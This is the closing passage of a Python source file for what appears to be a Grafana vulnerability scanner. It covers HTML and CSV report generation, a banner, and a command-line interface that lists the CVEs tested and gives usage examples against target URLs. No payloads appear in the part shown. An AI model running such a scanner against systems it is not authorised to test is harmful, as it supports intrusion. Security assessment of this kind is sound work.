        .stat-card h3 {{ font-size: 14px; color: #888; margin-bottom: 10px; }}
        .stat-card .value {{ font-size: 32px; font-weight: bold; }}
        .stat-card .critical {{ color: #dc3545; }}
        .stat-card .safe {{ color: #28a745; }}
        table {{ width: 100%; border-collapse: collapse; background: #1a1a2e; border-radius: 8px; overflow: hidden; border: 1px solid #2a2a4a; }}
        th, td {{ padding: 12px 15px; text-align: left; border-bottom: 1px solid #2a2a4a; }}
        th {{ background: #16213e; color: #888; font-size: 12px; text-transform: uppercase; }}
        tr:hover {{ background: #1f1f35; }}
        a {{ color: #0dcaf0; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
        .badge {{ display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; color: #000; }}
        code {{ background: #2a2a4a; padding: 2px 6px; border-radius: 4px; font-size: 12px; }}
        .footer {{ text-align: center; margin-top: 30px; color: #555; font-size: 12px; }}
        .severity-dist {{ display: flex; gap: 10px; margin: 20px 0; }}
        .severity-bar {{ height: 20px; border-radius: 3px; min-width: 4px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Grafana Security Scan Report</h1>
            <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Targets: {total_targets}</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Targets Scanned</h3>
                <div class="value safe">{total_targets}</div>
            </div>
            <div class="stat-card">
                <h3>Vulnerable</h3>
                <div class="value critical">{vulnerable_targets}</div>
            </div>
            <div class="stat-card">
                <h3>Secure</h3>
                <div class="value safe">{total_targets - vulnerable_targets}</div>
            </div>
            <div class="stat-card">
                <h3>Total Vulnerabilities</h3>
                <div class="value critical">{total_vulns}</div>
            </div>
        </div>
        
        <h2 style="margin-bottom: 15px;">Vulnerability Details</h2>
        <table>
            <thead>
                <tr>
                    <th>Target</th>
                    <th>Version</th>
                    <th>Severity</th>
                    <th>CVE ID</th>
                    <th>Description</th>
                    <th>Test URL</th>
                </tr>
            </thead>
            <tbody>
                {vuln_rows_html}
            </tbody>
        </table>
        
        <div class="footer">
            <p>Generated by Grafana Final Scanner | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
    </div>
</body>
</html>"""
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"{Colors.SUCCESS}[+] HTML report saved: {filename}{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.CRITICAL}[-] Error saving HTML report: {str(e)}{Colors.RESET}")
    
    def _save_csv_report(self, results: List[Dict], filename: str):
        """Save CSV format report"""
        try:
            with open(filename, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Target URL', 'Grafana Version', 'CVE ID', 'Severity', 'Description', 'Message', 'Test URL', 'Timestamp'])
                
                for result in results:
                    if result['vulnerabilities']:
                        for vuln in result['vulnerabilities']:
                            writer.writerow([
                                result['url'],
                                result.get('version', 'Unknown'),
                                vuln['cve_id'],
                                vuln['severity'],
                                vuln.get('description', ''),
                                vuln['message'],
                                vuln.get('test_url', ''),
                                result.get('timestamp', '')
                            ])
                    else:
                        writer.writerow([
                            result['url'],
                            result.get('version', 'Unknown'),
                            'N/A', 'N/A', 'No vulnerabilities found', '', '',
                            result.get('timestamp', '')
                        ])
            
            print(f"{Colors.SUCCESS}[+] CSV report saved: {filename}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.CRITICAL}[-] Error saving CSV report: {str(e)}{Colors.RESET}")


def print_banner():
    """Display professional tool banner"""
    banner = f"""
{Colors.CRITICAL}╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                         ║
║  {Colors.BOLD}░██████╗░██████╗░░█████╗░███████╗░█████╗░███╗░░██╗░█████╗░                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}██╔════╝░██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗░██║██╔══██╗                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}██║░░██╗░██████╔╝███████║█████╗░░███████║██╔██╗██║███████║                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}██║░░╚██╗██╔══██╗██╔══██║██╔══╝░░██╔══██║██║╚████║██╔══██║                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}╚██████╔╝██║░░██║██║░░██║██║Ziad░██║░░██║██║░╚███║██║░░██║                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝                {Colors.RESET}{Colors.CRITICAL} ║
║                                                                                                                         ║
║                                                                                                                         ║
║  {Colors.DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}{Colors.CRITICAL} ║
╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


def main():
    """Main execution flow"""
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='Grafana Final Scanner - Professional Vulnerability Assessment Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
{Colors.BOLD}USAGE EXAMPLES:{Colors.RESET}
  {sys.argv[0]} -u https://grafana.target.com
  {sys.argv[0]} -f targets.txt -o report
  {sys.argv[0]} -u https://grafana.internal.local --no-ssl-verify -v
  {sys.argv[0]} -u https://grafana.target.com --auth-token "glsa_xxx"
  {sys.argv[0]} -u https://grafana.target.com --auth-user admin --auth-pass password
  {sys.argv[0]} -u https://grafana.target.com --threads 10

{Colors.BOLD}TESTED VULNERABILITIES:{Colors.RESET}
  {Colors.CRITICAL}CRITICAL:{Colors.RESET}
    • CVE-2025-4123 - Path Traversal & Open Redirect XSS
    • CVE-2024-9264 - DuckDB SQL Injection (RCE)
    • CVE-2024-8118 - OAuth Authentication Bypass
    • CVE-2021-43798 - Directory Traversal (Arbitrary File Read)

  {Colors.HIGH}HIGH:{Colors.RESET}
    • CVE-2023-50164 - Plugin Path Traversal
    • CVE-2023-1410 - SSRF via Data Source Proxy
    • CVE-2023-2183 - Authentication Bypass
    • CVE-2018-15727 - Authentication Bypass (Cookie Forging)
    • CVE-2021-27358 - DoS via Snapshots API

  {Colors.MEDIUM}MEDIUM:{Colors.RESET}
    • CVE-2024-1313 - Information Disclosure
    • CVE-2020-11110 - Stored XSS
    • CVE-2021-41174 - AngularJS XSS
    • CVE-2021-39226 - Snapshot Enumeration

{Colors.BOLD}FEATURES:{Colors.RESET}
  • Multi-source version detection (7+ endpoints)
  • Version-aware vulnerability filtering
  • Configuration security analysis (CORS, headers, plugins, anonymous access)
  • Authentication support (Bearer token & Basic auth)
  • Multi-format reporting (JSON, HTML, CSV)
  • Parallel scanning with configurable threads
  • Rate limiting detection and handling
  • Color-coded severity indicators

{Colors.DIM}For more information, see README.md{Colors.RESET}
        '''
    )
    
    parser.add_argument('-u', '--url', help='Single target URL to scan')
    parser.add_argument('-f', '--file', help='File containing list of targets (one per line)')
    parser.add_argument('-o', '--output', help='Save detailed report (JSON, HTML, CSV) to file (extension auto-added)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='HTTP request timeout in seconds (default: 10)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output (show all checks)')
    parser.add_argument('--auth-token', help='Bearer token for authenticated scanning')
    parser.add_argument('--auth-user', help='Username for basic authentication')
    parser.add_argument('--auth-pass', help='Password for basic authentication')
    parser.add_argument('--threads', type=_positive_int, default=5, help='Max threads for parallel scanning (default: 5)')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
    
    # Initialize scanner
    scanner = GrafanaFinalScanner(
        timeout=args.timeout,
        verify_ssl=not args.no_ssl_verify,
        verbose=args.verbose,
        auth_token=args.auth_token,
        auth_user=args.auth_user,
        auth_pass=args.auth_pass,
        max_threads=args.threads
    )
    
    # Execute scan
    results = []
    
    try:
        if args.url:
            result = scanner.scan_target(args.url)
            results.append(result)
        
        if args.file:
            results.extend(scanner.scan_from_file(args.file))
        
        # Generate report
        scanner.generate_report(results, args.output)
        
    except KeyboardInterrupt:
        if results:
            print(f"\n\n{Colors.WARN}[!] Scan interrupted by user - generating partial report{Colors.RESET}")
            scanner.generate_report(results, args.output)
        else:
            print(f"\n\n{Colors.WARN}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.CRITICAL}[!] Fatal error: {str(e)}{Colors.RESET}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
